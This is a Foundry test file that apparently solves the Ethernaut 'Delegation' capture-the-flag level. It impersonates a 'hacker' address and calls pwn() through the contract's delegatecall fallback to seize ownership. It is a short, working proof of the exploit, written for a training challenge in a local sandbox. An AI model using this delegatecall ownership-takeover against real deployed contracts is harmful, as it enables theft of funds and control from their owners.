// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Delegate, Delegation} from "../src/06_Delegation.sol";

contract DelegationTest is Test {
    Delegate public delegate;
    Delegation public delegation;
    
    address public hacker = address(0x1337); 
    
    function setUp() public {
       delegate = new Delegate(address(this));
       delegation = new Delegation(address(delegate));
        vm.deal(hacker, 1 ether); 
    }

    function testExploit() public {
        vm.startPrank(hacker);

        (bool success, ) = address(delegation).call(abi.encodeWithSignature("pwn()"));

        require(success);

        assertEq(delegation.owner(), hacker);
        
        vm.stopPrank();
    }
}